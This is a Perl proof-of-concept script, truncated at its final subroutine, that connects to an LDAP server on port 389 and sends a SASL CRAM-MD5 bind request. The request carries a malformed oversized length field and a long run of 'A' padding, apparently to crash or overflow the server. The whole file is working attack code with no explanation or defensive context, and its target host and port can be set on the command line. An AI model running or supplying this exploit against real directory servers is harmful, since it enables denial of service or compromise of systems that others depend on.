#!/usr/bin/perl
 
 
use strict;
use warnings;
 
use Getopt::Std;
use IO::Socket::INET;
 
$SIG{INT}  = \&abort;
 
my $host  = '192.168.100.24';
my $port  = 389;
my $proto = 'tcp';
my $sockType = SOCK_STREAM;
my $timeout = 1;
 
my %opt;
my $opt_string = 'hH:P:t:';
getopts( "$opt_string", \%opt );
 
if (defined $opt{h}) {
    usage()
}
 
$host    = $opt{H} ? $opt{H} : $host;
$port    = $opt{P} ? $opt{P} : $port;
$timeout = $opt{t} ? $opt{t} : $timeout;
 
my @commands = (
{Command => 'Send',
 Data => "\x30\x18\x02\x01\x01\x60\x13\x02\x01\x03\x04\x00\xA3\x0C\x04\x08\x43\x52\x41\x4D\x2D\x4D\x44\x35\x04\x00"},
{Command => 'Receive'},
{Command => 'Send',
 Data => "\x30\x82\x01\x41\x02\x01\x02\x60\x82\x01\x3A\x02\x01\x03\x04\x00\xA3\x82\x01\x31\x04\x08\x43\x52\x41\x4D\x2D\x4D\x44\x35\x04\x84\xFF\xFF\xFF\xFF\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x20\x36\x61\x37\x61\x31\x31\x34\x39\x36\x30\x33\x61\x64\x37\x64\x30\x33\x34\x39\x35\x66\x39\x65\x37\x31\x34\x66\x34\x30\x66\x31\x63"},
{Command => 'Receive'},
 
);
 
 
my $sock = new IO::Socket::INET (  
                PeerAddr => $host,
                        PeerPort => $port,
                        Proto => $proto,
                Type => $sockType,
                Timeout => $timeout,
            )
    or die "socket error: $!\n\n";
 
print "connected to: $host:$port\n";
 
$sock->autoflush(1);
binmode $sock;
 
 
foreach my $command (@commands)
{
    if ($command->{'Command'} eq 'Receive')
    {
        my $buf = receive($sock, $timeout);
        if (length $buf)
        {
            print "received: [$buf]\n";
        }
    }
    elsif ($command->{'Command'} eq 'Send')
    {
        print "sending: [".$command->{'Data'}."]\n";
        send ($sock, $command->{'Data'}, 0) or die "send failed, reason: $!\n";
    }
}
 
close ($sock);
 
 
sub receive
{
 my $sock = shift;
 my $timeout = shift;
 
 my $tmpbuf;
 my $buf = "";
 
 while(1)
 {
  eval {
    local $SIG{ALRM} = sub { die "timeout\n" };
    alarm $timeout;
 
    my $ret = read $sock, $tmpbuf, 1;
    if ( !defined $ret or $ret == 0 )
    {
        die "timeout\n";
    }
 
    alarm 0;
    $buf .= $tmpbuf;
  };
  if ($@) {
    if($@ eq "timeout\n")
    {
        last;
    }
    else {
        die "receive aborted\n";
    }
  }
 }
 return $buf;
}
 
sub abort
{
 print "...\n";
 if ($sock)
 {
  close $sock;
 }
 die "...\n";
}
sub usage
